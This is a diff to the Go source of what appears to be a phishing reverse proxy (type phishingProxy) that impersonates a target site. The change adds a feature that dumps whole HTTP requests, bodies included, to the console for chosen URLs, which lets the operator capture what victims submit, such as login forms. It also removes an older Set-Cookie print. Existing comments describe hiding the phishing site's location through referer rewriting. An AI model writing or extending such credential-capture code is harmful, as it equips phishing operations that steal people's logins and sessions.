@@ -28,11 +28,22 @@ func (b *bufferPool) Put(payload []byte) {
 	b.Set(payload)
 }
 
-//多字符串匹配
+// 多字符串匹配
 func strContainList(rawStr string, checkStrList []string) bool {
 	rawStr = strings.ToLower(rawStr)
 	for _, checkStr := range checkStrList {
 		if strings.Contains(rawStr, strings.ToLower(checkStr)) {
+			return true
+		}
+	}
+	return false
+}
+
+// 多字符串完全匹配
+func strEqList(rawStr string, checkStrList []string) bool {
+	rawStr = strings.ToLower(rawStr)
+	for _, checkStr := range checkStrList {
+		if rawStr == strings.ToLower(checkStr) {
 			return true
 		}
 	}
@@ -54,6 +65,15 @@ func (p *phishingProxy) Director(request *http.Request) {
 	// Damn you, mutable state.
 	// Don't let a stray referer header give away the location of our site.
 	// Note that this will not prevent leakage from full URLs.
+
+	if strEqList(request.URL.RequestURI(), p.Reverse.DumpURL) {
+		req, _ := httputil.DumpRequest(request, true)
+		fmt.Printf("\n-------------------- %s start---------------------------\n\n\n", request.URL.RequestURI())
+		fmt.Println(string(req))
+		fmt.Printf("\n\n-------------------- %s end  ---------------------------\n\n", request.URL.RequestURI())
+
+	}
+
 	referer := request.Referer()
 	if referer != "" {
 		referer = strings.Replace(referer, request.Host, p.TargetURL.Host, 1)
@@ -152,11 +172,6 @@ func (p *phishingProxy) modifyCookieHeader(response *http.Response) error {
 	for _, mc := range mcook {
 		response.Header.Add("Set-Cookie", mc)
 	}
-	cooValue := response.Header.Get("Set-Cookie")
-	if cooValue != "" {
-		fmt.Println(cooValue)
-	}
-
 	return nil
 }
 
